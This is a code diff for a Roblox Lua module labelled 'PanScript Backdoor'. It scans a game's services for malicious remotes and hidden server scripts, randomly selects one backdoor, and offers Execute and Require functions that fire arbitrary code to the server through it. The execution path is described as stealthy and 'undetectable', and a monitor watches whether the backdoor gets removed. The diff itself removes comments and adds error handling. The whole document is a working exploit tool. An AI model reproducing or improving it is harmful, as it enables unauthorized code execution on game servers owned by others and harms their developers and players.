@@ -1,25 +1,23 @@
 local _bs = {}
-_bs._a = false          -- Active state
-_bs._selected = nil      -- Currently selected backdoor (only one)
-_bs._backup = {}        -- Backup list of other backdoors
-_bs._monitor = nil      -- Monitoring connection
-_bs._r = {}             -- All found malicious remotes
-_bs._n = {}             -- Normal remotes
-_bs._m = {}             -- Infected models
-_bs._s = tick()         -- Scan time
-_bs._cb = nil           -- Callback
+_bs._a = false
+_bs._selected = nil
+_bs._backup = {}
+_bs._monitor = nil
+_bs._r = {}
+_bs._n = {}
+_bs._m = {}
+_bs._s = tick()
+_bs._cb = nil
 
--- Configuration
 local _cfg = {
     debug = false,
     stealth = true,
     maxScanDepth = 20,
     executionDelay = 0.05,
-    monitorInterval = 2,  -- Check every 2 seconds
-    autoReconnect = false   -- Don't auto-reconnect, just notify
+    monitorInterval = 2,
+    autoReconnect = false
 }
 
--- Obfuscated strings
 local _str = {
     loadstring = ("\108\111\97\100\115\116\114\105\110\103"),
     require = ("\114\101\113\117\105\114\101"),
@@ -27,7 +25,6 @@ local _str = {
     RemoteFunction = ("\82\101\109\111\116\101\70\117\110\99\116\105\111\110"),
 }
 
--- Suspicious patterns
 local _pat = {
     "loadstring%(%s*%)%(%)",
     "OnServerEvent%:Connect%(.-loadstring",
@@ -37,7 +34,6 @@ local _pat = {
     "setfenv%(.-loadstring",
 }
 
--- Remote categorization
 local _cat = {
     normal = {"DataEvent", "UpdateEvent", "RequestEvent", "ResponseEvent", "PlayerEvent", "GameEvent", "Replicate", "Sync", "Remote", "Function", "Callback"},
     suspicious = {"Insert", "Loadstring", "HttpGet", "Run", "Execute", "Script", "Source", "Require", "Module", "Load", "Eval", "RunCode", "Backdoor", "Exploit", "Virus", "Infect"}
@@ -70,7 +66,6 @@ local function _isNormal(n)
     return false
 end
 
--- Analyze script source
 local function _analyzeScript(scr)
     if not scr or not scr:IsA("LuaSourceContainer") then return nil end
     
@@ -83,10 +78,14 @@ local function _analyzeScript(scr)
         IsBackdoor = false
     }
     
-    local ok, src = pcall(function() return scr.Source end)
+    local ok, src = pcall(function() 
+        -- Try to get source safely
+        return scr.Source 
+    end)
     
-    if not ok or not src then
-        local name = scr.Name:lower()
+    if not ok or not src or src == "" then
+        -- Fallback: check name only
+        local name = tostring(scr.Name):lower()
         if name:find("backdoor") or name:find("exploit") or name:find("virus") then
             info.RiskScore = 100
             info.IsBackdoor = true
@@ -116,7 +115,6 @@ local function _analyzeScript(scr)
     return info.RiskScore > 30 and info or nil
 end
 
--- Scan instance tree
 local function _scan(i, d)
     d = d or 0
     if d > _cfg.maxScanDepth then return {}, {}, {} end
@@ -125,10 +123,19 @@ local function _scan(i, d)
     local scr = {}
     local mdl = {}
     
-    if i:IsA(_str.RemoteEvent) or i:IsA(_str.RemoteFunction) then
+    -- Check if remote
+    local success, isRemote = pcall(function()
+        return i:IsA(_str.RemoteEvent) or i:IsA(_str.RemoteFunction)
+    end)
+    
+    if success and isRemote then
         local sus, score = _isSus(i.Name)
         local norm = _isNormal(i.Name)
         local cat = sus and "MALICIOUS" or (norm and "NORMAL" or "UNKNOWN")
+        
+        -- Get DebugId safely
+        local id = ""
+        pcall(function() id = i:GetDebugId() end)
         
         table.insert(rmt, {
             Object = i,
@@ -136,24 +143,41 @@ local function _scan(i, d)
             Type = i.ClassName,
             Path = i:GetFullName(),
             Category = cat,
-            RiskScore = score,
+            RiskScore = score or 0,
             Suspicious = sus,
             Parent = i.Parent,
             Depth = d,
-            InstanceId = i:GetDebugId() -- Unique ID for tracking
+            InstanceId = id
         })
     end
     
-    if i:IsA("Script") or i:IsA("LocalScript") or i:IsA("ModuleScript") then
+    -- Check if script
+    local isScript = pcall(function()
+        return i:IsA("Script") or i:IsA("LocalScript") or i:IsA("ModuleScript")
+    end)
+    
+    if isScript then
         local analysis = _analyzeScript(i)
         if analysis then
             table.insert(scr, analysis)
         end
     end
     
-    if i:IsA("Model") or i:IsA("Folder") then
-        for _, desc in ipairs(i:GetDescendants()) do
-            if desc:IsA("Script") and desc.RunContext == Enum.RunContext.Server then
+    -- Check if infected model
+    local isModel = pcall(function()
+        return i:IsA("Model") or i:IsA("Folder")
+    end)
+    
+    if isModel then
+        local children = {}
+        pcall(function() children = i:GetDescendants() end)
+        
+        for _, desc in ipairs(children) do
+            local isServerScript = pcall(function()
+                return desc:IsA("Script") and desc.RunContext == Enum.RunContext.Server
+            end)
+            
+            if isServerScript then
                 local n = tostring(desc.Name)
                 if #n > 50 or n:find("[\128-\255]") or n:match("^%s+$") or not desc.Archivable then
                     table.insert(mdl, {Model = i, Script = desc, Reason = "hidden_server"})
@@ -163,7 +187,11 @@ local function _scan(i, d)
         end
     end
     
-    for _, c in ipairs(i:GetChildren()) do
+    -- Recurse
+    local children = {}
+    pcall(function() children = i:GetChildren() end)
+    
+    for _, c in ipairs(children) do
         local cr, cs, cm = _scan(c, d + 1)
         for _, v in ipairs(cr) do table.insert(rmt, v) end
         for _, v in ipairs(cs) do table.insert(scr, v) end
@@ -173,13 +201,14 @@ local function _scan(i, d)
     return rmt, scr, mdl
 end
 
--- Test remote vulnerability
+-- [FIX] Added default value for depth parameter
 local function _test(r, depth)
+    depth = depth or 0  -- FIX: Default to 0 if nil
     if depth > 3 then return false, nil, 0 end
     
     local v = false
     local m = nil
-    local c = r.RiskScore or 0
+    local c = r.RiskScore or 0  -- FIX: Ensure c is never nil
     
     local p = r.Parent
     if p then
@@ -190,9 +219,14 @@ local function _test(r, depth)
             c = c + 50
         end
         
-        if p:IsA("Model") then
-            for _, d in ipairs(p:GetDescendants()) do
-                if d:IsA("Script") then
+        local isModel = pcall(function() return p:IsA("Model") end)
+        if isModel then
+            local children = {}
+            pcall(function() children = p:GetDescendants() end)
+            
+            for _, d in ipairs(children) do
+                local isScript = pcall(function() return d:IsA("Script") end)
+                if isScript then
                     local dn = tostring(d.Name)
                     if dn:sub(1,1) == "\0" or dn:find("\239\191\189") then
                         v = true
@@ -224,16 +258,15 @@ local function _test(r, depth)
     return v, m, c
 end
 
--- Select ONE random backdoor from list
+-- Select ONE random backdoor
 local function _selectRandomBackdoor(backdoors)
-    if #backdoors == 0 then return nil end
+    if #backdoors == 0 then return nil, {} end
     if #backdoors == 1 then return backdoors[1], {} end
     
-    -- Random selection
+    math.randomseed(tick())
     local selectedIndex = math.random(1, #backdoors)
     local selected = backdoors[selectedIndex]
     
-    -- Create backup list (all except selected)
     local backup = {}
     for i, bd in ipairs(backdoors) do
         if i ~= selectedIndex then
@@ -244,10 +277,10 @@ local function _selectRandomBackdoor(backdoors)
     return selected, backup
 end
 
--- Monitor selected backdoor for removal/modification
+-- Monitor selected backdoor
 local function _startMonitoring()
     if _bs._monitor then
-        _bs._monitor:Disconnect()
+        pcall(function() _bs._monitor:Disconnect() end)
         _bs._monitor = nil
     end
     
@@ -261,17 +294,17 @@ local function _startMonitoring()
     local name = target.Name
     local path = _bs._selected.Path
     
-    _log("Starting monitoring for: " .. path, "MONITOR")
+    _log("Monitoring: " .. path, "MONITOR")
     
-    -- Heartbeat-based monitoring
     local lastCheck = tick()
-    _bs._monitor = game:GetService("RunService").Heartbeat:Connect(function()
+    local rs = game:GetService("RunService")
+    
+    _bs._monitor = rs.Heartbeat:Connect(function()
         if tick() - lastCheck < _cfg.monitorInterval then return end
         lastCheck = tick()
         
-        -- Check if object still exists
-        local exists = pcall(function()
-            return target.Parent and target.Name
+        local exists, currentParent, currentName = pcall(function()
+            return target.Parent, target.Name
         end)
         
         if not exists then
@@ -280,32 +313,28 @@ local function _startMonitoring()
             return
         end
         
-        -- Check if parent changed (moved)
-        if target.Parent ~= parent then
+        if currentParent ~= parent then
             _log("BACKDOOR_MOVED: " .. path, "DISCONNECT")
             _bs.Disconnect()
             return
         end
         
-        -- Check if name changed (renamed)
-        if target.Name ~= name then
-            _log("BACKDOOR_RENAMED: " .. path .. " -> " .. target.Name, "DISCONNECT")
+        if currentName ~= name then
+            _log("BACKDOOR_RENAMED: " .. path, "DISCONNECT")
             _bs.Disconnect()
             return
         end
     end)
 end
 
--- Stop monitoring
 local function _stopMonitoring()
     if _bs._monitor then
-        _bs._monitor:Disconnect()
+        pcall(function() _bs._monitor:Disconnect() end)
         _bs._monitor = nil
-        _log("Monitoring stopped", "MONITOR")
     end
 end
 
--- Undetectable execution on SINGLE backdoor
+-- Undetectable execution
 local function _undetectableExec(code)
     if not _bs._selected then
         _log("No backdoor selected", "ERROR")
@@ -315,7 +344,6 @@ local function _undetectableExec(code)
     local r = _bs._selected.Object
     local t = _bs._selected.Type
     
-    -- Verify still exists
     local exists = pcall(function() return r.Parent end)
     if not exists then
         _log("Backdoor no longer exists!", "ERROR")
@@ -323,7 +351,6 @@ local function _undetectableExec(code)
         return false
     end
     
-    -- Stealth execution methods
     local function method1()
         if t == _str.RemoteEvent then
             pcall(function() r:FireServer(code) end)
@@ -347,15 +374,19 @@ local function _undetectableExec(code)
     end
     
     if _cfg.stealth then
-        return pcall(method4) or pcall(method1)
+        local ok1 = pcall(method4)
+        if ok1 then return true end
+        local ok2 = pcall(method1)
+        return ok2
     else
-        return pcall(method1)
+        local ok = pcall(method1)
+        return ok
     end
 end
 
--- Main scan function
+-- Main scan
 function _bs.Scan()
-    _log("Starting stealth scan...", "SCAN")
+    _log("Starting scan...", "SCAN")
     _bs._r = {}
     _bs._n = {}
     _bs._m = {}
@@ -363,14 +394,15 @@ function _bs.Scan()
     _bs._backup = {}
     _bs._s = tick()
     
-    local services = {
-        game:GetService("ReplicatedStorage"),
-        game:GetService("ReplicatedFirst"),
-        game:GetService("StarterGui"),
-        game:GetService("StarterPack"),
-        game:GetService("StarterPlayer"),
-        workspace
-    }
+    local services = {}
+    local serviceNames = {"ReplicatedStorage", "ReplicatedFirst", "StarterGui", "StarterPack", "StarterPlayer", "Workspace"}
+    
+    for _, name in ipairs(serviceNames) do
+        local ok, svc = pcall(function() return game:GetService(name) end)
+        if ok and svc then
+            table.insert(services, svc)
+        end
+    end
     
     local allR = {}
     local allS = {}
@@ -383,14 +415,13 @@ function _bs.Scan()
         for _, v in ipairs(am) do table.insert(allM, v) end
     end
     
-    _log(("Found %d remotes, %d suspicious scripts"):format(#allR, #allS), "SCAN")
+    _log(("Found %d remotes, %d scripts"):format(#allR, #allS), "SCAN")
     
-    -- Categorize remotes
     for _, r in ipairs(allR) do
         if r.Category == "NORMAL" then
             table.insert(_bs._n, r)
         else
-            local isV, method, conf = _test(r)
+            local isV, method, conf = _test(r, 0)  -- FIX: Pass depth explicitly
             if isV then
                 r.Vulnerable = true
                 r.ExecutionMethod = method
@@ -402,9 +433,11 @@ function _bs.Scan()
         end
     end
     
-    -- Add script-based backdoors
     for _, s in ipairs(allS) do
         if s.IsBackdoor then
+            local id = ""
+            pcall(function() id = s.Object:GetDebugId() end)
+            
             table.insert(_bs._r, {
                 Object = s.Object,
                 Name = s.Name,
@@ -415,21 +448,19 @@ function _bs.Scan()
                 ExecutionMethod = "script_source",
                 Confidence = s.RiskScore,
                 ScriptInfo = s,
-                InstanceId = s.Object:GetDebugId()
+                InstanceId = id
             })
         end
     end
     
-    -- SELECT ONLY ONE RANDOM BACKDOOR
+    -- SELECT ONE RANDOM BACKDOOR
     if #_bs._r > 0 then
         local selected, backup = _selectRandomBackdoor(_bs._r)
         _bs._selected = selected
         _bs._backup = backup
         
-        _log(("Selected 1 backdoor (from %d total): %s [%d%%]"):format(#_bs._r, selected.Path, selected.Confidence), "SELECT")
-        
-        if #backup > 0 then
-            _log(("Backup list: %d other backdoors available"):format(#backup), "BACKUP")
+        if selected then
+            _log(("Selected: %s [%d%%]"):format(selected.Path, selected.Confidence or 0), "SELECT")
         end
     end
     
@@ -440,18 +471,16 @@ function _bs.Scan()
     return _bs._selected ~= nil, #_bs._n
 end
 
--- Execute through SINGLE selected backdoor
 function _bs.Execute(code)
     if not _bs._a or not _bs._selected then
         _log("Backdoor not active", "ERROR")
         return false
     end
     
-    _log("Executing through selected backdoor...", "EXEC")
+    _log("Executing...", "EXEC")
     return _undetectableExec(code)
 end
 
--- Require through backdoor
 function _bs.Require(mid)
     if type(mid) == "number" then mid = tostring(mid) end
     local c = ([[
@@ -461,42 +490,40 @@ function _bs.Require(mid)
     return _bs.Execute(c)
 end
 
--- Initialize
 function _bs.Initialize(cb, cfg)
     _bs._cb = cb
     if cfg then for k,v in pairs(cfg) do _cfg[k] = v end end
-    _log("PanScript Backdoor initialized (Single Mode)", "INIT")
+    _log("Initialized (Single Mode)", "INIT")
     return _bs
 end
 
--- Activate (with monitoring)
 function _bs.Activate()
     if _bs._selected then
         _bs._a = true
         print(("PANS_BACKDOOR_ACTIVE:1:%s:%s"):format(_bs._selected.Path, _bs._selected.Type))
         print(("PANS_BACKDOOR_SELECTED:%s:%s:%s"):format(_bs._selected.Path, _bs._selected.Type, _bs._selected.ExecutionMethod or "direct"))
         
-        -- Start monitoring
         _startMonitoring()
         
-        _log("Backdoor active and monitored", "ACTIVE")
+        _log("Active and monitored", "ACTIVE")
         return true
     end
     _log("No backdoor selected", "ERROR")
     return false
 end
 
--- Disconnect from backdoor
 function _bs.Disconnect()
     _stopMonitoring()
     _bs._a = false
-    local oldPath = _bs._selected and _bs._selected.Path or "unknown"
+    local oldPath = "unknown"
+    if _bs._selected then
+        oldPath = _bs._selected.Path
+    end
     _bs._selected = nil
     print("PANS_BACKDOOR_DISCONNECTED:" .. oldPath)
-    _log("Disconnected from backdoor: " .. oldPath, "DISCONNECT")
+    _log("Disconnected: " .. oldPath, "DISCONNECT")
 end
 
--- Get status
 function _bs.GetStatus()
     return {
         Active = _bs._a,
@@ -508,12 +535,10 @@ function _bs.GetStatus()
     }
 end
 
--- Get selected backdoor info
 function _bs.GetSelected()
     return _bs._selected
 end
 
--- Get backup list
 function _bs.GetBackups()
     return _bs._backup
 end
